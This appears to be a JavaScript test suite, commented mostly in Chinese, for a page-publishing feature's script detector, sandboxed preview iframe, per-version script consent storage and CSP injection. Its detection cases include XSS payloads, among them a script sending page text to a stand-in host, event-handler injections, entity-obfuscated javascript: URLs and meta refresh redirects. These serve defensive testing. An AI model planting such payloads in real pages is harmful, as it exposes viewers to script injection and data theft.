/** fix#173：发布的页面在预览里运行不运行自己的脚本。查页面带不带脚本、记住点过的版本、预览框的 sandbox。 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { applyPageHardening, cspReportScriptTag } from '../lib/pages-csp.js'
import {
  PAGES_SCRIPTS_LIMIT, PAGES_SCRIPTS_STORAGE, allowPagesScripts, pagesActiveContent, pagesPreviewSandbox,
  pagesPreviewHtml, pagesScriptsAllowed, readPagesScriptsAllowed,
} from '../lib/pages-scripts.js'

/** 内存里的浏览器存储；initial 是存储里原来的那个值。 */
function memoryStorage(initial) {
  const map = new Map(initial === undefined ? [] : [[PAGES_SCRIPTS_STORAGE, initial]])
  const storage = { getItem: key => (map.has(key) ? map.get(key) : null), setItem: (key, value) => { map.set(key, String(value)) } }
  return () => storage
}

/** 照发布时的样子加固一个页面。 */
const published = body => applyPageHardening(`<!doctype html><html><head><title>t</title></head><body>${body}</body></html>`)

test('发布时叠进页面开头的上报脚本不算页面自己的脚本', () => {
  assert.equal(pagesActiveContent(published('<h1>报表</h1><table><tr><td>1</td></tr></table><style>td{color:red}</style>')), false)
})

test('页面自己的脚本、事件属性、javascript: 地址、自动刷新、srcdoc 都算带脚本，换写法也查得出', () => {
  const cases = [
    '<script>location.href="https://x.example/?d="+document.body.innerText</script>',
    '<SCRIPT src="https://cdn.jsdelivr.net/npm/chart.js"></SCRIPT>',
    '<script\ntype="module">1</script>',
    '<svg><script>1</script></svg>',
    '<img src=x onerror=go()>',
    '<svg/onload=go()>',
    '<div class="a"onclick="go()">x</div>',
    '<body ONLOAD = "go()">',
    '<a href="javascript:go()">x</a>',
    '<a href="&#106;avascript:go()">x</a>',
    '<a href="&#x6A;avascript&colon;go()">x</a>',
    '<a href="&#106avascript:go()">x</a>',
    '<a href="java&Tab;script:go()">x</a>',
    '<a href="java\nscript:go()">x</a>',
    '<svg><a xlink:href="javascript:go()"><text>x</text></a></svg>',
    '<meta http-equiv="refresh" content="0;url=https://x.example/?d=1">',
    '<meta http-equiv=Refresh content="0;url=https://x.example/">',
    '<meta http-equiv="&#x72;efresh" content="0;url=https://x.example/">',
    '<iframe srcdoc="<p>x</p>"></iframe>',
  ]
  for (const body of cases) assert.equal(pagesActiveContent(published(body)), true, body)
})

test('正文里只是写到脚本的样子不算：转义过的标签、不带等号的属性名', () => {
  for (const body of ['<pre>&lt;script&gt;go()&lt;/script&gt;</pre>', '<p>用 onclick 属性绑定点击</p>', '<p>脚本、事件</p>']) {
    assert.equal(pagesActiveContent(published(body)), false, body)
  }
})

test('点过「运行脚本」只算那一版：别的版本、别的页面都没点过', () => {
  const storage = memoryStorage()
  assert.equal(pagesScriptsAllowed('sales', 2, storage), false)
  assert.equal(allowPagesScripts('sales', 2, storage), true)
  assert.equal(pagesScriptsAllowed('sales', 2, storage), true)
  assert.equal(pagesScriptsAllowed('sales', 1, storage), false)
  assert.equal(pagesScriptsAllowed('other', 2, storage), false)
})

test('存储里的内容坏了或不是字符串列表时，当作一版都没点过', () => {
  for (const bad of ['not json', '{"a":1}', '[1,2]', 'null']) assert.deepEqual(readPagesScriptsAllowed(memoryStorage(bad)), [], bad)
})

test('有不合法或重复的版本键时忽略整份授权，下一次明确选择可以重新保存', () => {
  for (const item of ['unfinished', 'Sales@1', 'sales@0', 'sales@01', 'sales@9007199254740992', 'sales@1']) {
    const storage = memoryStorage(JSON.stringify(['sales@1', item]))
    assert.equal(pagesScriptsAllowed('sales', 1, storage), false, item)
    assert.equal(allowPagesScripts('new', 1, storage), true)
    assert.deepEqual(readPagesScriptsAllowed(storage), ['new@1'])
  }
})

test('浏览器存储不能用时：读到空列表，记不进去返回 false', () => {
  const denied = () => { throw new Error('storage denied') }
  assert.deepEqual(readPagesScriptsAllowed(denied), [])
  assert.equal(allowPagesScripts('sales', 1, denied), false)
  const full = () => ({ getItem: () => null, setItem: () => { throw new Error('quota') } })
  assert.equal(allowPagesScripts('sales', 1, full), false)
})

test('最多记上限那么多版：再点一版丢掉最早的；重新点的挪到最后', () => {
  const old = Array.from({ length: PAGES_SCRIPTS_LIMIT }, (_, i) => `p@${i + 1}`)
  const storage = memoryStorage(JSON.stringify(old))
  allowPagesScripts('p', 1, storage)
  assert.equal(readPagesScriptsAllowed(storage).at(-1), 'p@1')
  allowPagesScripts('q', 1, storage)
  const list = readPagesScriptsAllowed(storage)
  assert.equal(list.length, PAGES_SCRIPTS_LIMIT)
  assert.equal(list.includes('p@2'), false)
  assert.deepEqual(list.slice(-2), ['p@1', 'q@1'])
})

test('预览框只在带脚本、而且这一版点过时给 allow-scripts', () => {
  assert.equal(pagesPreviewSandbox(false, false), '')
  assert.equal(pagesPreviewSandbox(false, true), '')
  assert.equal(pagesPreviewSandbox(true, false), '')
  assert.equal(pagesPreviewSandbox(true, true), 'allow-scripts')
})

test('不运行脚本时放进预览框的页面去掉我们的上报脚本，运行时原样放', () => {
  const html = published('<h1>月报</h1>')
  assert.equal(pagesPreviewHtml(html, '').includes(cspReportScriptTag()), false)
  assert.match(pagesPreviewHtml(html, ''), /<h1>月报<\/h1>/)
  assert.equal(pagesPreviewHtml(html, 'allow-scripts'), html)
})

test('static design boards authorize their own bridge for this render and preserve document mode', async () => {
  const { designFrameHTML } = await import('../lib/design-bridge.js')
  const opts = { nonce: 'test-channel', board: 'desktop', version: 1, declarations: [], limits: {} }
  const input = published('<h1>Quarterly report</h1>')
  const render = () => designFrameHTML(input, opts)
  const html = render()
  const bridgeNonce = value => {
    const bridge = value.match(/<script\b[^>]*\bid="dsh-design-bridge"[^>]*>/i)?.[0]
    return bridge?.match(/\bnonce="([^"]+)"/i)?.[1]
  }
  const nonce = bridgeNonce(html)
  assert.ok(nonce, 'the trusted bridge has its own CSP nonce')
  assert.notEqual(nonce, opts.nonce, 'the public message channel is independent')
  assert.notEqual(bridgeNonce(render()), nonce)
  assert.ok(html.startsWith('<!doctype html>'))
  const policies = [...html.matchAll(/http-equiv="Content-Security-Policy" content="([^"]+)"/gi)].map(match => match[1])
  assert.ok(policies.some(policy => policy.split(';').map(part => part.trim()).includes("script-src 'nonce-" + nonce + "'")))
  assert.ok(html.indexOf("script-src 'nonce-") < html.indexOf('Quarterly report'))
  assert.ok(!html.includes(cspReportScriptTag()))
  assert.ok(designFrameHTML(published('<script></script><h1>Report</h1>'), opts).includes(cspReportScriptTag()), 'the approved interactive board retains the published content')
})

test('only the publishing preamble owns a reporter; displayed source remains intact', () => {
  const source = '<textarea>' + cspReportScriptTag() + '</textarea>'
  const preview = pagesPreviewHtml(published(source), '')
  assert.ok(preview.includes(source))
  assert.equal(preview.split(cspReportScriptTag()).length - 1, 1)
})

test('embedded documents and speculative metadata are gated even with no destination or code', () => {
  for (const part of ['<object>Fallback</object>', '<iframe title="Example"></iframe>', '<link rel="dns-prefetch">', '<link rel="prefetch">']) {
    assert.ok(pagesActiveContent(published(part)), part)
  }
  assert.equal(pagesActiveContent(published('<p>Plain report</p>')), false)
})

test('a scriptless Blob receives the preview policy ahead of its content, including for older stored pages', () => {
  const html = published('<h1>Report</h1>')
  const safe = pagesPreviewHtml(html, '')
  assert.match(safe, /http-equiv="x-dns-prefetch-control" content="off"/i)
  assert.ok(safe.indexOf('x-dns-prefetch-control') < safe.indexOf('<h1>'))
  assert.ok(safe.includes("base-uri 'none'"))
  assert.ok(pagesPreviewHtml('<p>Archived report</p>', '').includes("connect-src 'none'"), 'the preview supplies the resource policy even when an old document has no publishing header')
  assert.equal(pagesPreviewHtml(html, 'allow-scripts'), html)
})

test('preview policy comes before author bytes and preserves ordinary standards and quirks documents', () => {
  for (const doctype of ['', '<!doctype html>', '<!DOCTYPE html SYSTEM "about:legacy-compat">']) {
    const preview = pagesPreviewHtml(applyPageHardening('<!-- author banner -->' + doctype + '<p>Report</p>'), '')
    assert.ok(preview.startsWith(doctype + '<head>'))
    assert.ok(preview.indexOf('Content-Security-Policy') < preview.indexOf('author banner'))
    assert.ok(preview.includes('<p>Report</p>'))
  }
})
